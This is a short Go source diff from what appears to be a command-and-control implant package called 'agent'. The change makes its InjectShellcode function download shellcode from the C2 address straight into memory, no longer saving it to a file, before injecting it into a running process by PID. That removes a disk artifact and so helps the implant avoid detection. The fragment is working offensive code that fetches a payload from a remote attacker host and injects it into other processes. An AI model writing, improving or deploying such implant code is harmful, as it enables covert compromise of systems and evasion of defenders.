@@ -3,7 +3,6 @@ package agent
 import (
 	"encoding/hex"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
@@ -266,14 +265,9 @@ func Injector(shellcode *string, pid int) error {
 // InjectShellcode inject shellcode to a running process using various methods
 func InjectShellcode(pid int, method string) (err error) {
 	// prepare the shellcode
-	shellcodeFile := AgentRoot + "/shellcode.txt"
-	err = DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
+	sc, err := DownloadViaCC(CCAddress+"shellcode.txt", "")
 	if err != nil {
 		return
-	}
-	sc, err := ioutil.ReadFile(shellcodeFile)
-	if err != nil {
-		return err
 	}
 	shellcode := string(sc)
 	shellcodeLen := strings.Count(string(shellcode), "0x")
